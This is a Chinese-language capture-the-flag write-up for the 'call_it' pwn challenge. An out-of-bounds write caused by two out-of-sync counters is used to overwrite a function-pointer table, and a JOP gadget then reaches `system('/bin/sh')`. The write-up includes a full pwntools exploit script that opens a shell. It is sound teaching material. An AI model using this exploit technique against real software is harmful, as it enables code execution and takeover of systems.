# call_it

## 题目简述

程序让用户为 MoeBot 登记最多 8 个动作，分别存入 `gestures[8]` 函数指针数组与 `talks[8][16]` 文本数组。循环下标 `i` 每轮都会递增，但计数器 `n_gestures` 只在合法选择时递增；连续提交非法选项即可让后续合法写入越过两个数组边界，伪造执行阶段使用的函数指针表。

## 解题过程

漏洞来自两个不同步的计数变量：

```c
for (size_t i = 0; n_gestures < 8; ++i) {
    /* 读取 choice */
    switch (choice) {
    case 1:
        gestures[i] = walk;
        ++n_gestures;
        break;
    /* 其它合法动作 */
    default:
        puts("Invalid choice, try again.");
        continue;  // i 仍会由 for 循环递增
    }
    fgets(talks[i], sizeof(talks[i]), stdin);
}
```

先发送 8 次非法选择，把 `i` 推到 8 而不增加 `n_gestures`。之后两次合法动作会使 `talks[8]`、`talks[9]` 覆盖相邻的 `gestures` 表，从而布置 JOP 风格的调度结构。

程序还特意提供了如下 gadget：

```assembly
mov rax, rdi
mov rdi, qword ptr [rax + 0x8]
call qword ptr [rax + 0x10]
```

它把 `rdi` 指向的表解释为：当前项、下一项中的第一个参数、再下一项中的调用目标。与 ROP 依赖 `ret` 和 `rsp` 不同，这条链通过间接 `call` 和普通寄存器中的表地址传递控制。

本题布局对应的利用如下：

```python
from pwn import p64, process

io = process("./pwn")

gift = 0x401235
call_system = 0x401228
bin_sh_ptr = 0x4040F8

for _ in range(8):
    io.sendlineafter(b"gesture: ", b"6")

# talks[8] 覆盖 gestures[0]、gestures[1]
io.sendlineafter(b"gesture: ", b"1")
io.sendafter(b"gesture? ", p64(gift) + p64(bin_sh_ptr)[:7])

# talks[9] 覆盖 gestures[2]，并在已知地址放置 /bin/sh
io.sendlineafter(b"gesture: ", b"1")
io.sendlineafter(b"gesture? ", p64(call_system) + b"/bin/sh")

io.sendlineafter(b"gesture: ", b"0")
io.interactive()
```

执行阶段调用伪造的 `gestures[0]`，`gift` 从表中取出 `bin_sh_ptr` 放入 `rdi`，再间接调用指向 `system` 调用点的 `gestures[2]`。

## 方法总结

- 核心技巧：利用“循环下标递增、有效计数不递增”的状态不同步造成 OOB 写，再把相邻内存布置成间接调用表。
- 识别信号：数组索引和循环终止条件使用不同变量，且错误分支只更新其中一个时，应检查无效输入能否推进索引。
- 复用要点：JOP 的核心不是栈，而是“调度 gadget + 可控寄存器/表 + 间接跳转”；构造前必须精确确认全局数组布局和间接调用时的寄存器状态。
